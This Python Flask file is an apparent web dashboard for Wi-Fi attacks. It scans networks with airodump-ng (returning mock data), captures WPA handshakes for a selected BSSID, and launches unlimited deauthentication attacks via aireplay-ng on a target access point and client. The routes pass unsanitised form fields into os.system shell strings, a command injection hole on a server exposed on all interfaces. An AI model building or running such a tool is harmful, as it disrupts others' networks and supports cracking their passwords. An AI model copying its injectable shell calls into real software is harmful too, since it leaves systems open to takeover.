from flask import Flask, render_template, jsonify, request
import os
import subprocess
import threading

app = Flask(__name__)

# Store scanned networks in a global list
scanned_networks = []

# Function to continuously scan networks
def scan_networks():
    global scanned_networks
    while True:
        # Run airodump-ng in the background and capture results in CSV format
        result = subprocess.run(
            ["airodump-ng", "wlan0mon", "--output-format", "csv", "-w", "/tmp/scan_results"],
            capture_output=True, text=True
        )
        
        # Parse the CSV output to extract network information (SSID, BSSID, etc.)
        # For simplicity, here we just mock some data
        # You can parse the actual CSV file output using a CSV parser if needed
        mock_networks = [
            {"ssid": "Network1", "bssid": "00:14:22:01:23:45", "channel": "6", "signal": "-65"},
            {"ssid": "Network2", "bssid": "00:14:22:01:23:46", "channel": "11", "signal": "-70"},
        ]
        
        # Update the global list of scanned networks
        scanned_networks = mock_networks

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/scan", methods=["GET"])
def get_scanned_networks():
    return jsonify(scanned_networks)

@app.route("/handshake", methods=["POST"])
def handshake():
    bssid = request.form["bssid"]
    # Trigger handshake capture based on selected BSSID (You can integrate with actual capture logic)
    os.system(f"airmon-ng start wlan0")  # Start monitor mode if it's not started
    os.system(f"airodump-ng --bssid {bssid} -c 6 --write /tmp/handshake wlan0mon")  # Replace with real command to capture handshake
    return f"Started handshake capture for {bssid}!"

@app.route("/deauth", methods=["POST"])
def deauth():
    bssid = request.form["bssid"]
    # Trigger deauth attack based on selected BSSID (You can integrate with actual attack logic)
    client = request.form["client"]
    os.system(f"aireplay-ng --deauth 0 -a {bssid} -c {client} wlan0mon")  # Replace with real command to launch deauth attack
    return f"Started deauth attack on {bssid} targeting client {client}!"

if __name__ == "__main__":
    # Start the network scanning in a separate thread so it runs in the background
    threading.Thread(target=scan_networks, daemon=True).start()
    app.run(host="0.0.0.0", port=8080)
